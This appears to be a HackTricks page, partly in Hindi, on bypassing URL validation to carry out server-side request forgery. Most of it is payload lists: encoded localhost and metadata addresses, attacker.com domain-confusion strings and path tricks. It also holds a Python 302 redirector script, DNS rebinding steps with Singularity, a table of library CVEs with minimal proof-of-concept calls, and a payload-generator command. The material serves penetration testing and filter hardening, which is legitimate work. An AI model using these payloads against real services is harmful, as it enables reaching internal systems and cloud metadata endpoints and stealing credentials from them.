# URL Format Bypass

{{#include ../../banners/hacktricks-training.md}}

### Localhost

<details>
<summary>Localhost payloads</summary>
```bash
# Localhost
0 # Yes, just 0 is localhost in Linux
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CIDR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Mixed encodings bypass
169.254.43518 -> Partial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number
0xA9.254.0251.0376 -> hexadecimal, decimal and octal

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
</details>

![](<../../images/image (776).png>)

यह **Burp extension** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) IP फॉर्मैटिंग बायपास लागू करता है।

### डोमेन पार्सर

<details>
<summary>डोमेन पार्सर बायपास</summary>
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
# double encoded fragment to bypass split("#"): attacker.com%2523@victim
```
</details>
```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
### Domain Confusion

<details>
<summary>Domain confusion payloads</summary>
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
# colon + backslash confusion (CVE-2025-0454 in autogpt)
http://localhost:\@google.com/../

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

# Parameter pollution
next={domain}&next=attacker.com
```
</details>

### Paths and Extensions Bypass

यदि यह आवश्यक हो कि URL किसी path या extension में समाप्त हो, या इसमें एक path होना चाहिए, तो आप नीचे दिए गए किसी एक bypass को आज़मा सकते हैं:
```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

यह टूल [**recollapse**](https://github.com/0xacb/recollapse) दिए गए इनपुट से विविधताएँ जेनरेट कर सकता है ताकि उपयोग किए गए regex को बायपास करने की कोशिश की जा सके। अधिक जानकारी के लिए [**this post**](https://0xacb.com/2022/11/21/recollapse/) भी देखें।

### Automatic Custom Wordlists

Check out the [**URL validation bypass cheat sheet** webapp](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) from portswigger जहाँ आप allowed host और attacker का होस्ट डाल सकते हैं और यह आपके लिए आज़माने के लिए URL की सूची जेनरेट कर देगा। यह यह भी देखता है कि क्या आप URL को किसी parameter में, Host header में या CORS header में उपयोग कर सकते हैं।

{{#ref}}
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
{{#endref}}

### Bypass via redirect

संभव है कि सर्वर SSRF के **मूल request** को **filter** कर रहा हो लेकिन उस request के संभावित **redirect** response को नहीं।\
उदाहरण के लिए, SSRF के माध्यम से vulnerable सर्वर (`url=https://www.google.com/`) हो सकता है कि **url param** को फ़िल्टर कर रहा हो। लेकिन यदि आप जिस जगह पर redirect करना चाहते हैं वहां 302 के साथ respond करने के लिए एक [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) का उपयोग करते हैं, तो आप 127.0.0.1 जैसे फ़िल्टर किए गए IP addresses या यहाँ तक कि gopher जैसे फ़िल्टर किए गए **protocols** तक पहुँच पाने में सक्षम हो सकते हैं।\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

<details>
<summary>SSRF परीक्षण के लिए सरल redirector</summary>
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
</details>

### DNS rebinding bypass (2025+)

Even when an SSRF filter performs a **single DNS resolution before sending the HTTP request**, you can still reach internal hosts by rebinding the domain between lookup and connection:

1. `victim.example.com` को किसी public IP पर point करें ताकि यह allow‑list / CIDR चेक पास कर जाए।
2. बहुत कम TTL सर्व करें (या अपने नियंत्रण में एक authoritative server उपयोग करें) और वास्तविक request भेजने से ठीक पहले domain को `127.0.0.1` या `169.254.169.254` पर rebind करें।
3. Tools like **Singularity** (`nccgroup/singularity`) authoritative DNS + HTTP server को automate करते हैं और तैयार payloads शामिल करते हैं। Example launch: `python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080`.

यह technique 2025 में BentoML "safe URL" patch और इसी तरह के single‑resolve SSRF filters को bypass करने के लिए इस्तेमाल हुई थी।

### समझाई गई तरकीबें

#### Backslash-trick

The _backslash-trick_ [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) और [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B) के बीच के अंतर का फायदा उठाता है। जहाँ RFC3986 URIs के लिए एक सामान्य ढांचा है, WHATWG web URLs के लिए विशिष्ट है और आधुनिक ब्राउज़रों द्वारा अपनाया गया है। मुख्य अंतर यह है कि WHATWG मानक backslash (`\`) को forward slash (`/`) के समकक्ष मानता है, जिससे URL parsing प्रभावित होती है और विशेष रूप से hostname से path में होने वाले संक्रमण को चिह्नित किया जाता है।

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)

#### Left square bracket

userinfo segment में “left square bracket” character `[` Spring’s UriComponentsBuilder को ऐसा hostname value लौटाने पर मजबूर कर सकता है जो browsers से अलग हो: [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)

#### अन्य भ्रम

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)

चित्र स्रोत: [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

#### IPv6 Zone Identifier (%25) Trick

RFC 6874 का समर्थन करने वाले आधुनिक URL parsers *link-local* IPv6 addresses में percent sign के बाद एक **zone identifier** शामिल करने की अनुमति देते हैं। कुछ security filters इस syntax से अवगत नहीं होते और केवल square-bracketed IPv6 literals को हटाते हैं, जिससे निम्न payload internal interface तक पहुँच सकता है:
```text
http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
```
यदि लक्ष्य एप्लिकेशन सत्यापित करता है कि होस्ट *not* `fe80::1` है लेकिन parsing `%` पर रुक जाती है, तो यह अनुरोध को गलत तरीके से बाहरी मान सकता है। किसी भी सुरक्षा निर्णय से पहले पते को हमेशा सामान्यीकृत करें या वैकल्पिक zone id को पूरी तरह हटा दें।

### हाल की लाइब्रेरी पार्सिंग CVEs (2022–2026)

कई प्रमुख frameworks में hostname‑mismatch समस्याएँ आई हैं जिन्हें ऊपर बताए गए ट्रिक्स से URL validation बायपास होने पर SSRF के लिए एक्सप्लॉइट किया जा सकता है:

| Year | CVE | Component | बग सारांश | न्यूनतम PoC |
|------|-----|-----------|----------|-------------|
| 2025 | CVE-2025-0454 | Python `requests` + `urllib.parse` (autogpt) | `http://localhost:\\@google.com/../` पर parsing mismatch allow‑lists को यह सोचने देता है कि host `google.com` है जबकि अनुरोध `localhost` पर जाता है। | `requests.get("http://localhost:\\@google.com/../")` |
| 2025 | CVE-2025-2691 | Node package `nossrf` | SSRF रोकने के लिए बनी लाइब्रेरी केवल मूल hostname की जाँच करती है, न कि **resolved IP** की, जिससे ऐसे hostnames अनुमति मिल जाते हैं जो private रेंज पर resolve होते हैं। | `curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1` |
| 2024 | CVE-2024-29415 | Node `ip` package | `isPublic()` ने dotted‑octal / short‑form localhost (उदा., `0127.0.0.1`, `127.1`) को सार्वजनिक घोषित कर दिया, जिससे फिल्टर internal targets को स्वीकार कर लेते हैं। | `ip.isPublic('0127.0.0.1')` returns true on vulnerable versions |
| 2024 | CVE-2024-3095 | Langchain WebResearchRetriever | कोई host filtering नहीं; AI agents से GET अनुरोध IMDS/localhost तक पहुँच सकते थे। | User‑controlled URL inside `WebResearchRetriever` |
| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | `[` userinfo में Spring और browsers द्वारा अलग तरह से parsed होता है, जिससे allow‑list बायपास संभव हुआ। | `https://example.com\[@internal` |
| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | Backslash confusion ने `http://example.com\\@169.254.169.254/` को ऐसे host फ़िल्टरों से बायपास करने की अनुमति दी जो `@` पर split करते हैं। | — |
| 2022 | CVE-2022-3602 | OpenSSL | नाम के साथ `.` suffix होने पर hostname verification स्किप हो जाता था (dotless domain confusion)। | — |

### Payload-generation helpers (2024+)

बड़े कस्टम word-lists हाथ से बनाना झंझट वाला है। ओपन‑सोर्स टूल **SSRF-PayloadMaker** (Python 3) अब स्वचालित रूप से *80 k+* host‑mangling संयोजन बना सकता है, जिसमें मिश्रित encodings, forced-HTTP डाउनग्रेड और backslash variants शामिल हैं:
```bash
# Generate every known bypass that transforms the allowed host example.com to attacker.com
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```
प्राप्त सूची को सीधे Burp Intruder या `ffuf` में दिया जा सकता है।

## संदर्भ

- [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-22243](https://nvd.nist.gov/vuln/detail/CVE-2024-22243)
- [https://github.com/hsynuzm/SSRF-PayloadMaker](https://github.com/hsynuzm/SSRF-PayloadMaker)
- [https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe](https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe)
- [https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381](https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381)

{{#include ../../banners/hacktricks-training.md}}
